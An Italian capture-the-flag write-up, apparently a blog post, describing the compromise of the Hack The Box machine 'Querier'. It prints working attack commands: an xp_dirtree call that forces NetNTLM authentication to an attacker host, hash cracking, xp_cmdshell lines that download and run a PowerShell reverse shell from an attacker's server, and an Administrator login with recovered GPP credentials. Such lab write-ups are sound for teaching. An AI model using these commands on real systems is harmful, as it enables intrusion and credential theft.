+++
date = '2026-07-22T17:24:22+02:00'
draft = false
title = 'Querier Writeup IT'
+++

**Autore**: **`joy.scd01`**

**Date**: **`22/07/2026`**

![Querier.png](/images/imgs_querier/Querier.png)

---
# Introduzione

**_Querier_** è una macchina **Windows** di livello **Medio**. L'exploitation path inizia con l'enumerazione **SMB**, che porta ad un file **Excel** con **macro** abilitate contenente credenziali **MSSQL** hardcoded. Queste credenziali vengono utilizzate per forzare un'autenticazione **NTLM** tramite **`xp_dirtree`**, permettendomi di rubare e craccare un **hash NetNTLM**. Con la password craccata, ho ottenuto accesso sysadmin al database, da li ho eseguito comandi tramite **`xp_cmdshell`** e ottenuto una reverse shell. La Privilege Escalation si basa sulla scoperta di un file **Group Policy Preferences** (**GPP**) in cache contenente la password dell'**Administrator**, garantendo la compromissione totale del sistema.

---
# Tecniche Utilizzate

- **Ispezione Macro & Estrazione Credenziali**

- **NetNTLM Theft**

- **Password Hash Cracking**

- **Abuso di MSSQL xp_cmdshell**

- **Abuso di file GPP in Cache**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- querier -Pn
```

```text
PORT      STATE    SERVICE      REASON
135/tcp   open     msrpc        syn-ack ttl 127
139/tcp   open     netbios-ssn  syn-ack ttl 127
445/tcp   open     microsoft-ds syn-ack ttl 127
1433/tcp  open     ms-sql-s     syn-ack ttl 127
5985/tcp  open     wsman        syn-ack ttl 127
47001/tcp open     winrm        syn-ack ttl 127
```

Scansione mirata con script di default e rilevamento dei servizi:

```bash
nmap -sC -sV querier -Pn
```

```text
PORT     STATE SERVICE       REASON          VERSION
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.71.63:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
```

**Nota**: _Lo script **`ms-sql-ntlm-info`** sulla porta **1433** ha rivelato con successo il nome del dominio dell'ambiente **Active Directory** interno (**HTB.LOCAL**). Questo conferma che **Querier** è una macchina unita a un dominio, che agisce come **Member Server** piuttosto che come **Domain Controller**._

## Enumerazione SMB

Poiché **SMB** era aperto, ho iniziato a enumerare le share utilizzando **NetExec**. Ho testato sia sessioni null che l'accesso come Guest senza risultati:

```bash
nxc smb querier -u '' -p '' --shares
nxc smb querier -u 'Guest' -p '' --shares
```

Ho provato anche ad usare **smbmap**:

```bash
smbmap -H querier
```

Non so bene il perché, ma ancora nessun risultato.

![smbfail.png](/images/imgs_querier/smbfail.png)


Tuttavia, quando ho provato ad elencare le share usando **smbclient**, questo ha rivelato con successo una share **`Reports`**. Mi sono connesso ad essa e ho scaricato tutto il suo contenuto.

```bash
smbclient -L \\\\querier
smbclient \\\\querier\\Reports
smb: \> mget *
```

![file.png](/images/imgs_querier/file.png)

---
# Accesso Iniziale | Da MSSQL alla Reverse Shell

Ho aperto il file scaricato con **LibreOffice Calc** e ispezionato le **macro** del documento.

![macro.png](/images/imgs_querier/macro.png)

Scavando nel codice, ho trovato un set di credenziali e la stringa di connessione per il server **MSSQL**:

![sqlpass.png](/images/imgs_querier/sqlpass.png)

Ho effettuato l'accesso al database usando **impacket-mssqlclient**:

```bash
impacket-mssqlclient reporting@querier -windows-auth
```

Esplorando un po', mi sono reso conto di non poter fare molto poiché l'utente **`reporting`** non aveva i privilegi **SA**, il che significava che non potevo nemmeno abilitare **`xp_cmdshell`**.

![insuff.png](/images/imgs_querier/insuff.png)

**Nota**: _A questo punto, mi sono ricordato di una tecnica per rubare gli **hash NetNTLM** da un server **MSSQL** forzandolo ad autenticarsi verso una share **SMB** controllata da noi. È documentata qui su [**HackTricks**](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)._

Ho configurato **Responder** sulla mia macchina attaccante:

```bash
sudo responder -I tun0
```

E sul prompt **MSSQL**, ho innescato l'autenticazione usando la **stored procedure `xp_dirtree`**:

```SQL
exec xp_dirtree '\\attacker_ip\share\file'
```

![hash.png](/images/imgs_querier/hash.png)

**Responder** ha catturato l'**hash NetNTLM** per l'utente **`mssql-svc`**. Ho salvato l'hash in un file e l'ho craccato con **john**:

```bash
john mssql_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![pass.png](/images/imgs_querier/pass.png)

Utilizzando queste nuove credenziali, ho effettuato nuovamente l'accesso al server **MSSQL**:

```bash
impacket-mssqlclient mssql-svc@querier -windows-auth
```

Ora, con le autorizzazioni corrette, ho abilitato **`xp_cmdshell`**.

![xp_cmd.png](/images/imgs_querier/xp_cmd.png)

Prima di ottenere una shell, ho letto la **user flag** direttamente dal database utilizzando la funzione **`OPENROWSET`**:

```SQL
xp_cmdshell dir C:\Users\mssql-svc\Desktop
SELECT * FROM OPENROWSET(BULK N'C:\Users\mssql-svc\Desktop\user.txt', SINGLE_CLOB) AS Contents
```

![userflag.png](/images/imgs_querier/userflag.png)

Per ottenere un accesso iniziale vero e proprio, ho recuperato una copia di **`Invoke-PowerShellTcp.ps1`**, ho aggiunto i dettagli della mia connessione in fondo allo script e l'ho hostato utilizzando **Python**:

```bash
echo "Invoke-PowerShellTcp -Reverse -IPAddress <attacker_ip> -Port <attacker_port>" >> Invoke-PowerShellTcp.ps1
python3 -m http.server
```

Tornando al prompt **MSSQL**, ho usato **`xp_cmdshell`** per scaricare ed eseguire lo script della reverse shell:

```SQL
xp_cmdshell powershell iwr -uri http://10.10.16.77:8000/Invoke-PowerShellTcp.ps1 -Outfile C:\Users\mssql-svc\Desktop\fall.ps1
xp_cmdshell powershell.exe -command "C:\Users\mssql-svc\Desktop\fall.ps1"
```

![transfer.png](/images/imgs_querier/transfer.png)

![initial_access.png](/images/imgs_querier/initial_access.png)

Ho ricevuto la connessione sul mio listener e ho ottenuto con successo una reverse shell come **`mssql-svc`**.

---
# Privilege Escalation | GPP Abuse

Con un foothold sul sistema, ho controllato i privilegi utilizzando **`whoami /priv`** e ho notato subito che il **`SeImpersonatePrivilege`** era abilitato.

![rabbit.png](/images/imgs_querier/rabbit.png)

Inizialmente ho cercato di abusarne con un **attacco GodPotato**. Ricevevo una connessione di ritorno sul mio listener, ma per qualche motivo non ottenevo una shell utilizzabile. Ho anche trasferito **`WinPEAS.exe`** sulla macchina target, ma non sono riuscito a eseguirlo.

Poiché questi eseguibili non funzionavano, sono passato all'enumerazione basata su **PowerShell** utilizzando **`PowerUp.ps1`**:

```PowerShell
Import-Module .\RowRowFightThePowa.ps1
Invoke-AllChecks
```

![creds.png](/images/imgs_querier/creds.png)

Lo script ha trovato con successo un file **GPP** in **Cache** (**Group Policy Preferences**) contenente la password dell'**Administrator** in chiaro.

![kamina.jpeg](/images/imgs_querier/kamina.jpeg)

A questo punto mi è bastato connettermi alla macchina utilizzando **Evil-WinRM** per prendere la **root flag**.

```bash
evil-winrm -i querier -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
```

![rootflag.png](/images/imgs_querier/rootflag.png)

---
# Considerazioni Finali

Sebbene **_Querier_** sia classificata ufficialmente come box di livello **Medio**, personalmente mi è sembrato molto più **Easy-level**. Se si ha già familiarità con l'exploitation di **MSSQL**, il path verso la compromissione totale è piuttosto lineare.

L'unico passaggio che potrebbe giustificare la classificazione **Medio** è la fase di accesso iniziale. Forzare il furto di **NetNTLM** tramite **`xp_dirtree`** è un vettore leggermente più inusuale rispetto all'avere l'esecuzione diretta di **`xp_cmdshell`** fin da subito. Tuttavia, una volta ottenuto e craccato quell'hash, la macchina cade molto rapidamente.

**Fonti**:

- **MSSQL HackTricks | https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html**

- **PowerUp.ps1 | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1**